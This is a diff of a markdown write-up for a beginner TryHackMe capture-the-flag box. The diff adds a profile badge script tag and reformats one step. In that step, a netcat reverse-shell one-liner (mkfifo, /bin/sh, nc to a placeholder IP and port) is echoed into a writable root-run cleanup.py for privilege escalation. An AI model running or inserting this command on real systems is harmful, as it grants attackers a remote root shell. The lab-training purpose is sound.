@@ -4,6 +4,8 @@
 
 *"This is a beginner box based on simple enumeration of services and basic privilege escalation techniques."* -[csenox](https://tryhackme.com/p/csenox)
 
+<script src="https://tryhackme.com/badge/59136"></script>
+
 1. [Scan/Enumeration](#scan/enumeration)
 2. [Gain Shell](#gain-shell)
 3. [Privilege Escalation](#privilege-escalation)
@@ -107,7 +109,7 @@ Let's look inside the file named cleanup.py.
 
 The file regularly cleans the /home/cleanup/ directory. When we look at the file with the "ls -la" command, we see that we have write authority. So if we change the file with a reverse shell and wait a bit, we can get a shell with root privilege. I will write python reverse shell into the file with the echo command.
 
-`echo 'import os; os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc **<IP>** **<PORT>**  >/tmp/f")' > cleanup.py`
+`echo 'import os; os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT>  >/tmp/f")' > cleanup.py`
 
 ![tartarus-17](.Images/tartarus-17.png)
 
